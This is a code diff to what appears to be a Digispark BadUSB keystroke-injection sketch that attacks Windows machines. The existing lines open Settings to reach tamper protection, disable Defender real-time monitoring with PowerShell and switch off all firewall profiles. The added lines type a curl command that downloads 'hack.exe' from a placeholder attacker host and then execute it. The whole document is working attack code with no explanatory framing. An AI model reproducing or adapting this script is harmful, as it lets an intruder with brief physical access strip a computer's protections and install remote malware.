@@ -13,7 +13,7 @@ void loop() {
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_I, MOD_GUI_LEFT);
-  DigiKeyboard.delay(700);
+  DigiKeyboard.delay(1000);
   DigiKeyboard.print("tamper protection");
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_DOWN);
@@ -63,7 +63,11 @@ void loop() {
   DigiKeyboard.println("powershell Set-MpPreference -DisableRealtimeMonitoring $true");
   DigiKeyboard.delay(400);
   DigiKeyboard.println("powershell Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False");
-  DigiKeyboard.delay(400);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.println("curl http://ATTACKER_IP/hack.exe --output h.exe");
+  DigiKeyboard.delay(1500);
+  DigiKeyboard.println(".\\h");
+  DigiKeyboard.delay(500);
   DigiKeyboard.println("exit");
 
   while(true){
